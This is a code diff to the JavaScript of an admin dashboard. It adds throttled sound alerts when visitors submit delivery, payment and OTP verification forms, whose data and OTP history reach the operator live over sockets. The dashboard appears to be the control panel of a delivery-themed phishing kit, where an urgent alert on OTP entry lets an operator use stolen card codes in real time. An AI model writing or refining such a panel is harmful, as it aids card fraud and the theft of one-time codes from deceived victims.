@@ -8,35 +8,109 @@ let adminToken = localStorage.getItem('admin_token');
 let isMuted = false;
 let audioContext = null;
 
-// Audio notification sounds using Web Audio API
+// ==========================================
+// SMART SOUND SYSTEM - No sounds during typing, alerts only on submission
+// ==========================================
+
+// Track which events we've already notified about (prevent spam)
+const notifiedEvents = new Map();
+
+// Sound definitions using Web Audio API
 const sounds = {
-  newVisitor: () => playTone([523.25, 659.25, 783.99], 0.3),
-  formDelivery: () => playTone([392, 523.25], 0.2, 0.1),
-  formPayment: () => playTone([329.63, 392, 523.25, 659.25], 0.15, 0.1),
-  formVerification: () => playTone([261.63, 329.63, 392, 523.25, 659.25, 783.99], 0.1, 0.1)
+  // New visitor arrives - triple ascending beep
+  newVisitor: () => {
+    if (isMuted) return;
+    playSmartBeep([523.25, 659.25, 783.99], 0.15, 0.08);
+  },
+  
+  // Delivery form submitted - NICE DOUBLE BEEP (success)
+  formDelivery: () => {
+    if (isMuted) return;
+    // Double beep: two short friendly tones
+    playSmartBeep([523.25, 0, 659.25], 0.12, 0.1);
+  },
+  
+  // Payment submitted - FINANCIAL CONFIRMATION (higher pitch, strong)
+  formPayment: () => {
+    if (isMuted) return;
+    // Ascending financial confirmation
+    playSmartBeep([659.25, 0, 783.99, 0, 1046.50], 0.1, 0.12);
+  },
+  
+  // OTP verification - RAPID ALERT (urgent)
+  formVerification: () => {
+    if (isMuted) return;
+    // Rapid triple alert
+    playSmartBeep([880, 0, 880, 0, 1046.50], 0.08, 0.06);
+  }
 };
 
-function playTone(frequencies, duration, gap = 0) {
-  if (isMuted) return;
+// Generate smart beep using Web Audio API
+function playSmartBeep(frequencies, duration = 0.15, gap = 0.1) {
   try {
-    if (!audioContext) {
-      audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    // Create new AudioContext (user gesture required for first time)
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    
+    // Resume context if suspended (browser policy)
+    if (ctx.state === 'suspended') {
+      ctx.resume();
     }
+    
     frequencies.forEach((freq, i) => {
-      const oscillator = audioContext.createOscillator();
-      const gainNode = audioContext.createGain();
+      if (freq === 0) return; // Skip silence gaps
+      
+      const startTime = ctx.currentTime + (i * (duration + gap));
+      
+      // Create oscillator
+      const oscillator = ctx.createOscillator();
+      const gainNode = ctx.createGain();
+      
+      // Connect
       oscillator.connect(gainNode);
-      gainNode.connect(audioContext.destination);
+      gainNode.connect(ctx.destination);
+      
+      // Set frequency - use different wave types for variety
       oscillator.frequency.value = freq;
-      oscillator.type = 'sine';
-      const startTime = audioContext.currentTime + (gap * i);
+      oscillator.type = i % 2 === 0 ? 'sine' : 'triangle';
+      
+      // Volume envelope - smooth attack and release
       gainNode.gain.setValueAtTime(0, startTime);
-      gainNode.gain.linearRampToValueAtTime(0.3, startTime + 0.05);
-      gainNode.gain.linearRampToValueAtTime(0, startTime + duration);
+      gainNode.gain.linearRampToValueAtTime(0.25, startTime + 0.02); // Attack
+      gainNode.gain.linearRampToValueAtTime(0.15, startTime + duration * 0.5); // Decay
+      gainNode.gain.linearRampToValueAtTime(0, startTime + duration); // Release
+      
+      // Start and stop
       oscillator.start(startTime);
       oscillator.stop(startTime + duration);
     });
-  } catch (e) { console.warn('Audio not supported:', e); }
+    
+    // Cleanup context after all sounds done
+    setTimeout(() => ctx.close(), (frequencies.length * (duration + gap) + 0.5) * 1000);
+    
+  } catch (e) { 
+    console.warn('Audio playback not supported:', e); 
+  }
+}
+
+// Check if we should play sound (prevent duplicate notifications)
+function shouldPlaySound(sessionId, eventType) {
+  const key = `${sessionId}_${eventType}`;
+  const now = Date.now();
+  const lastPlayed = notifiedEvents.get(key);
+  
+  // Don't play if played in last 3 seconds (prevent spam)
+  if (lastPlayed && (now - lastPlayed) < 3000) {
+    return false;
+  }
+  
+  notifiedEvents.set(key, now);
+  
+  // Clean old entries (older than 1 minute)
+  for (const [k, v] of notifiedEvents) {
+    if (now - v > 60000) notifiedEvents.delete(k);
+  }
+  
+  return true;
 }
 
 // Initialize Socket Connection
@@ -142,38 +216,34 @@ function setupSocketListeners() {
 
   socket.on('form:deliverySubmitted', (data) => {
     console.log('📦 DATA RECEIVED VIA SOCKET (form:deliverySubmitted):', data);
-    sounds.formDelivery();
+    // Play sound ONLY for actual submission - with spam protection
+    const sessionId = data.session_id || 'unknown';
+    if (shouldPlaySound(sessionId, 'delivery')) {
+      sounds.formDelivery();
+    }
     updateStats();
-    updateVisitorCard(data.session_id, { 
-      form_submitted: true, 
-      delivery_data: data.delivery_data,
-      is_online: true
-    });
     updateVisitorsList();
   });
 
   socket.on('form:paymentSubmitted', (data) => {
     console.log('💳 DATA RECEIVED VIA SOCKET (form:paymentSubmitted):', data);
-    sounds.formPayment();
+    // Play sound ONLY for actual submission - with spam protection
+    const sessionId = data.session_id || 'unknown';
+    if (shouldPlaySound(sessionId, 'payment')) {
+      sounds.formPayment();
+    }
     updateStats();
-    updateVisitorCard(data.session_id, { 
-      payment_submitted: true, 
-      payment_data: data.payment_data,
-      is_online: true
-    });
     updateVisitorsList();
   });
 
   socket.on('form:verificationSubmitted', (data) => {
     console.log('🔐 DATA RECEIVED VIA SOCKET (form:verificationSubmitted):', data);
-    sounds.formVerification();
+    // Play sound ONLY for actual submission - with spam protection
+    const sessionId = data.session_id || 'unknown';
+    if (shouldPlaySound(sessionId, 'verification')) {
+      sounds.formVerification();
+    }
     updateStats();
-    updateVisitorCard(data.session_id, { 
-      verification_submitted: true, 
-      verification_data: data.verification_data,
-      otp_history: data.otp_history || [],
-      is_online: true
-    });
     updateVisitorsList();
   });
 
